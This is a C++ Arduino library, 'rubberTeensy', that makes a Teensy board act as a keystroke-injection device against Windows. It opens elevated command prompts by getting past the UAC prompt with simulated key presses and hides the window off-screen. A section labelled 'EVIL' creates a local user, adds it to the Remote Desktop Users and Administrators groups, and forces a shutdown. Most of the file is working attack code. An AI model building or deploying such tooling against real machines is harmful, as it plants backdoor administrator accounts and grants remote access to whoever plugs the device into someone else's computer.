/* rubberTeensy by ohxeighty.
 * https://ohxeighty.github.io
 * This cpp file along with the accompanying header file should be placed
 * inside your arduino libraries directory
 */

#include "Arduino.h"
#include "rubberTeensy.h"

/* Initialise instance of RubberTeensy */
RubberTeensy::RubberTeensy(int delayMs, int ledPin, int initDelay){
    _LED_Pin = 0;
    this->SetDelay(delayMs);  
    this->SetLEDPin(ledPin); 
   // give some time for the usb to stop shitting itself  
    delay(initDelay); 
}

/* Set the base delay which most functions use a multiple of */ 
void RubberTeensy::SetDelay(int delay){
    _delay = delay;
}

/* Set the LED pin
 * https://www.pjrc.com/teensy/pinout.html
 * LED Pin:
 * Teensy 4.0: 13
 * Teensy 3.6: 13
 * Teensy 3.5: 13
 * Teensy 3.2: 13
 * Teensy 3.1: 13
 * Teensy 3.0: 13
 * Teensy LC: 13
 * Teensy 2.0: 11
 * Teensy++ 2.0: 6
 * Teensy 1.0: 6
 * Teensy++ 1.0: 6
 */
void RubberTeensy::SetLEDPin(int pin){
    pinMode(_LED_Pin, INPUT);
    pinMode(pin, OUTPUT); 
    _LED_Pin = pin; 
}

/* Get the current base delay */
int RubberTeensy::GetDelay(){
    return _delay;
}

/* Get the current LED pin */
int8_t RubberTeensy::GetLEDPin(){
    return _LED_Pin;
}

/* Open CMD and run command
 * methods: 
 * 0 - Press the Windows Key (KEY_LEFT_GUI) to open the context key, 
 * type cmd, then press enter. Then type in command and press enter. 
 * admin - Try open as admin if supported by method
 */
void RubberTeensy::OpenCMD(int8_t method, bool admin){
	Keyboard.begin();
    switch(method) {
	case 0:
        Keyboard.press(KEY_LEFT_GUI); 
        delay(_delay*2.0); 
        Keyboard.release(KEY_LEFT_GUI);
        delay(_delay*2.0);
        Keyboard.print("cmd");
        delay(_delay*2.0); 
		
        if(admin){
            Keyboard.press(KEY_LEFT_CTRL); 
            Keyboard.press(KEY_LEFT_SHIFT);
            delay(_delay);
            Keyboard.press(KEY_RETURN);
            Keyboard.releaseAll();
            delay(_delay*3.0);
            // Defaults to no in UAC prompt  
            Keyboard.press(KEY_LEFT_ARROW);
            delay(_delay*3.0);
        } 

        Keyboard.press(KEY_RETURN); 
        delay(_delay);
        Keyboard.release(KEY_RETURN);
        delay(_delay); 
        break;	
	default:
		// no behaviour 
		break; 
    }
    Keyboard.end();
}

/* Run a command 
 * command - The command string to execute 
 * method:
 * 0 - Call OpenCMD then Write 
 * 1 - Open the run dialog box and execute the command
 * 2 - Open the run dialog box and run cmd with the command passed in through the /C flag
 * 3 - Write wscript in temp folder then execute with hidden window  
 * admin - Run the command with admin privileges if supported by method
 */ 

void RubberTeensy::RunCommand(const char *command, int8_t method, bool admin){
    switch(method){
    case 0:
        this->OpenCMD(0,admin); 
        this->Write(command);
        this->Write("exit");
        break;  
    case 1:
        Keyboard.press(KEY_LEFT_GUI); 
        delay(_delay);
        Keyboard.press('r'); 
        delay(_delay);
        Keyboard.releaseAll(); 
        delay(_delay);
        Keyboard.print(command); 
        delay(_delay); 
        if(admin){
            Keyboard.press(KEY_LEFT_CTRL);
            Keyboard.press(KEY_LEFT_SHIFT);
            delay(_delay);
        } 
        Keyboard.press(KEY_RETURN);
        delay(_delay);
        Keyboard.releaseAll();
        delay(_delay*3.0);
        if(admin){
            Keyboard.press(KEY_LEFT_ARROW);
            delay(_delay*3.0);
            Keyboard.press(KEY_RETURN);
            delay(_delay);
            Keyboard.releaseAll();
            delay(_delay);
        }
        break;  
    default:
        break; 
    }
}


/* Hide the current window by dragging it down */ 
void RubberTeensy::HideWindow(){
    Keyboard.begin();
    Keyboard.press(KEY_LEFT_ALT);
    Keyboard.press(' ');
    delay(_delay);
    Keyboard.releaseAll();
    Keyboard.press('m');
    delay(_delay); 
    Keyboard.release('m');  
    Mouse.begin();
    Mouse.press();
    delay(_delay); 
    // mouse move signed char, -128 - 127 
    Mouse.move(0, 127); 
    Mouse.end(); 
    Keyboard.end();
    delay(_delay);
}

/* Repeat Keypress */
void RubberTeensy::RepeatKey(char key, int repeat){
    for(int i =0; i < repeat; i++){
        Keyboard.press(key); 
        delay(_delay/5);
        Keyboard.release(key);  
    }
}

/* Blink */ 
void RubberTeensy::Blink(int duration){
    digitalWrite(_LED_Pin, HIGH); 
    delay(duration); 
    digitalWrite(_LED_Pin, LOW);
    delay(duration); 
}

void RubberTeensy::Write(const char *input){
    Keyboard.print(input); 
    delay(_delay);
    Keyboard.press(KEY_RETURN);
    delay(_delay);
    Keyboard.release(KEY_RETURN);
    delay(_delay);
}

/* ==== EVIL ==== */ 

/* Add a user to the system and attempt to add them to the Remote Desktop Users group. 
 * username - username
 * pass - password
 * admin - whether the user should be added to the Administrator group
 */ 

void RubberTeensy::AddUser(const char *username, const char *pass, bool admin){
    char command[100];  
    snprintf(command, 100, "net user %s %s /ADD", username, pass);  
    RunCommand(command, 1, 1); // Adding a user requires admin privs

    snprintf(command, 100, "net localgroup 'Remote Desktop Users' %s /ADD", username); // Add user to RDP group 
    RunCommand(command, 1, 1); 
    if(admin){
        // add user to administrator group 
        snprintf(command, 100, "net localgroup administrators %s /ADD", username); 
        RunCommand(command, 1, 1); 
    }
}

/* Shutdown the system after delay seconds */ 
void RubberTeensy::Shutdown(int delay){
    char command[50]; 
    snprintf(command, 50, "shutdown -s -t %d", delay);
    RunCommand(command, 1, 0);
}


